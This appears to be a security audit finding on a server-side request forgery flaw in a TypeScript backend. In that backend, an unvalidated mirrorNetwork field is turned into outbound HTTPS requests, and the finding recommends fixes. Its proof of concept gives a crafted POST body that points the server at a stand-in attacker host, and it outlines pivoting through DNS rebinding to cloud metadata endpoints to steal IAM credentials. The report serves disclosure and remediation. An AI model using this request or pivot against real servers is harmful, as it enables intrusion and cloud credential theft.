### Title
Server-Side Request Forgery (SSRF) via Unvalidated `mirrorNetwork` Field Passed to Backend HTTP Client

### Summary
The backend's `MirrorNodeREST.fromBaseURL()` utility accepts any arbitrary string as a `mirrorNetwork` value and constructs an outbound HTTPS URL from it without whitelisting. Because the `mirrorNetwork` field in `CreateTransactionDto` is user-supplied and stored verbatim in the database, an authenticated attacker can inject an arbitrary hostname, causing the backend chain service to issue HTTP GET requests to attacker-controlled infrastructure — a classic Server-Side Request Forgery (SSRF) pattern directly analogous to the "too generic external call" class in the reference report.

### Finding Description

**Root cause — unvalidated URL construction:**

`back-end/libs/common/src/utils/mirrorNode/index.ts`, lines 27–41:

```typescript
export const MirrorNodeREST = {
  fromBaseURL(mirrorNetwork: string) {
    switch (mirrorNetwork) {
      case MAINNET: ...
      case TESTNET: ...
      case PREVIEWNET: ...
      case LOCAL_NODE: ...
      default:
        return `https://${mirrorNetwork}`;   // ← arbitrary attacker-controlled host
    }
  },
  ...
};
``` [1](#0-0) 

Any string that does not match the four known constants falls through to the `default` branch and is interpolated directly into a URL.

**Propagation — backend HTTP client uses this URL:**

`back-end/libs/common/src/transaction-signature/mirror-node.client.ts`, lines 181–183 and 195:

```typescript
private getMirrorNodeRESTURL(mirrorNetwork: string): string {
  return `${MirrorNodeREST.fromBaseURL(mirrorNetwork)}${this.endpointPrefix}`;
}
// ...
const response = await this.httpService.axiosRef.get<T>(url, { ... });
``` [2](#0-1) [3](#0-2) 

`fetchAccountInfo()` and `fetchNodeInfo()` both call `getMirrorNodeRESTURL(mirrorNetwork)` with the value that originated from the stored transaction record.

**Entry point — user-controlled `mirrorNetwork` in the transaction DTO:**

`back-end/apps/api/src/transactions/dto/create-transaction.dto.spec.ts` shows `mirrorNetwork` is a plain `string` field with no enum or allowlist constraint visible in the reviewed code: [4](#0-3) 

The `validateAndPrepareTransaction()` function validates signature, expiry, size, and node IDs, but performs no whitelist check on `mirrorNetwork`: [5](#0-4) 

The value is stored verbatim in the `Transaction` entity: [6](#0-5) 

**Exploit flow:**

1. Attacker authenticates to the organization API (normal user account).
2. Attacker submits `POST /transactions` with `mirrorNetwork: "attacker.example.com"`.
3. Backend stores the transaction with the injected `mirrorNetwork`.
4. The chain service picks up the transaction and calls `MirrorNodeClient.fetchAccountInfo(accountId, "attacker.example.com")`.
5. `getMirrorNodeRESTURL("attacker.example.com")` returns `"https://attacker.example.com/api/v1"`.
6. The backend issues `GET https://attacker.example.com/api/v1/accounts/<accountId>` — a server-side request originating from the backend container.

To reach internal cloud metadata (e.g., AWS IMDSv1 at `169.254.169.254`), the attacker can use a DNS name they control that resolves to the internal IP, bypassing the `https://` prefix restriction.

### Impact Explanation

- **SSRF to attacker-controlled external host:** The backend's egress IP is leaked; the attacker can observe request headers and timing.
- **SSRF to internal cloud/cluster services:** In the Kubernetes deployment (confirmed by `charts/` Helm configuration), the attacker can redirect via DNS rebinding or a CNAME to internal cluster IPs, the Kubernetes API server, or cloud provider metadata endpoints (AWS IMDSv1, GCP metadata). Successful exploitation of cloud metadata can yield IAM credentials, enabling full cloud account compromise.
- **Repeated retries amplify the attack:** `MirrorNodeClient` retries up to 3 times with exponential backoff on unknown errors, meaning each injected transaction generates multiple outbound requests. [7](#0-6) 

### Likelihood Explanation

- **Attacker precondition:** A valid organization user account — obtainable by self-registration or by being invited. No admin privileges required.
- **Attack complexity:** Low. The attacker submits a single crafted JSON body to a documented REST endpoint.
- **Detection difficulty:** The injected `mirrorNetwork` value looks like a legitimate custom network string; no anomaly detection is in place.

### Recommendation

1. **Whitelist `mirrorNetwork` at the DTO level.** Add `@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])` (or an `@IsEnum`) decorator to the `mirrorNetwork` field in `CreateTransactionDto`. Reject any value outside the known set.
2. **Harden `MirrorNodeREST.fromBaseURL()`.** Remove or restrict the `default` branch. If custom networks must be supported, validate the hostname against an operator-configured allowlist before constructing the URL.
3. **Apply the same fix to `MirrorNetworkGRPC.fromBaseURL()`**, which has an identical `default` branch that appends `:443` to arbitrary input. [8](#0-7) 

### Proof of Concept

```
POST https://<org-server>/transactions
Authorization: Bearer <valid-user-jwt>
Content-Type: application/json

{
  "name": "ssrf-test",
  "description": "ssrf",
  "transactionBytes": "<valid-frozen-tx-hex>",
  "signature": "<valid-sig-hex>",
  "creatorKeyId": 1,
  "mirrorNetwork": "attacker.example.com",
  "isManual": false
}
```

**Expected outcome:** The backend chain service, when processing this transaction, issues:

```
GET https://attacker.example.com/api/v1/accounts/<accountId>
```

from the backend container's IP. The attacker's server at `attacker.example.com` receives the request, confirming SSRF. To pivot to internal services, replace `attacker.example.com` with a DNS name that resolves to `169.254.169.254` (AWS IMDSv1) or the Kubernetes API server IP, and observe the response data returned in error logs or side-channel timing.
